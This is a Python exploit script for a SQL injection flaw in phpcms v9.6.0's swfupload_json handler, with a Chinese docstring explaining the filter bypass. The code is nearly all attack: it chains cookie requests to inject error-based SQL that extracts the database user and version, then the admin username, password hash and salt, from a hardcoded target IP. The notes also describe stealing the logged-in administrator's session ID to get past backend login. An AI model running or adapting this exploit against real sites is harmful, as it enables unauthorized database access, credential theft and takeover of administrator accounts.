#!/usr/bin/env python
#coding:utf-8
#environ: python3.5 32bit
#code by luan
#edit by shuichon

'''
V0.1，phpcms v9.6.0 swfupload_json sql injection
usage: phpcms.py http://1.2.3.4/

漏洞分析：
swfupload会上传json格式的cookies，其中会调用safe_relace函数会对（%27、%2527）等进行过滤，但在针对*号过滤时，存在问题。
如果传入（%*27），过滤后为（%27），则可以传入恶意字符。
src参数的值传入后被json_encode加密为json，传入json_str数组，然后将其转为cookie。
tips：
phpcms的密文特别难解密,不能破解密码的情况下,可以尝试绕过后台验证
phpcms数据库中表v9_session，保存着管理员登录的信息，字段sessionid就是已经登录
管理后台的PHPSESSID，可以通过sql注入读取到这个值，并写入到自己的浏览器中。
直接访问后台地址：/index.php?m=admin&c=index&a=public_menu_left
将数据库中的sessionid信息带入即可。
'''

import sys, requests, urllib

# url = sys.argv[1]
target = 'http://122.9.16.209'
print('Phpcms v9.6.0 SQLi Exploit Code')

sqli_prefix = '%*27an*d%20'
sqli_info = 'e*xp(~(se*lect%*2af*rom(se*lect co*ncat(0x6c75616e24,us*er(),0x3a,ver*sion(),0x6c75616e24))x))'
sqli_password1 = 'e*xp(~(se*lect%*2afro*m(sel*ect co*ncat(0x6c75616e24,username,0x3a,password,0x3a,encrypt,0x6c75616e24) fr*om '
sqli_password2 = '_admin li*mit 0,1)x))'
sqli_padding = '%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6'
vul_url = '/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id='

step1 = target + '/index.php?m=wap&a=index&siteid=1'
cokies = {}

# 访问step1,获取cookies，获取身份。然后将其传入src参数。
for c in requests.get(step1).cookies:
	print(c)
	# 访问step1，则会返回一个cookies，cookies名称即c.name，最后7个字符必定是‘_siteid’字符串
	if c.name[-7:] == '_siteid':
		cokie_head = c.name[:6]
		print (cokie_head)
		cokies[cokie_head+'_userid'] = c.value
		# cokies = c.value
		#TODO cokies 存在互斥问题，一个cokies多次赋值。
print('[+] Get Cookie : ' + str(cokies))

# 将cookies POST方式传入到userid_flash变量

step2 = target + vul_url + sqli_prefix + urllib.quote_plus(sqli_info, safe='qwertyuiopasdfghjklzxcvbnm*') \
        + sqli_padding
# print (step2, cokies)
# print (requests.get(step2, cookies=cokies))
# print (requests.get(step2, cookies=cokies).cookies)
for c in requests.get(step2, cookies=cokies).cookies:
	print (c.name)
	if c.name[-9:] == '_att_json':
		sqli_payload = c.value
		print('[+] Get SQLi Payload : ' + sqli_payload)

		#将通过json和cookie加密的sqli，传入a_k变量
		step3 = target + '/index.php?m=content&c=down&a_k=' + sqli_payload
		html = requests.get(step3, cookies=cokies).content
		print('[+] Get SQLi Output : ' + html.split('luan$')[1])

		# 获取到表前缀
		table_prefix = html
		print('[+] Get Table Prefix : ' + table_prefix)

		# 通过获取到的表前缀，进一步修正sqli
		step2 = target + vul_url + sqli_prefix + urllib.quote_plus(sqli_password1, safe='qwertyuiopasdfghjklzxcvbnm*') \
        + table_prefix + urllib.quote_plus(sqli_password2, safe='qwertyuiopasdfghjklzxcvbnm*') + sqli_padding
for c in requests.get(step2, cookies=cokies).cookies:
	if c.name[-9:] == '_att_json':
		sqli_payload = c.value
		print('[+] Get SQLi Payload : ' + sqli_payload)
		step3 = target + '/index.php?m=content&c=down&a_k=' + sqli_payload
		html = requests.get(step3, cookies=cokies).content
		# print ("debug: html infos:", html)
		print('[+] Get SQLi Output : ' + html.split('luan$')[1])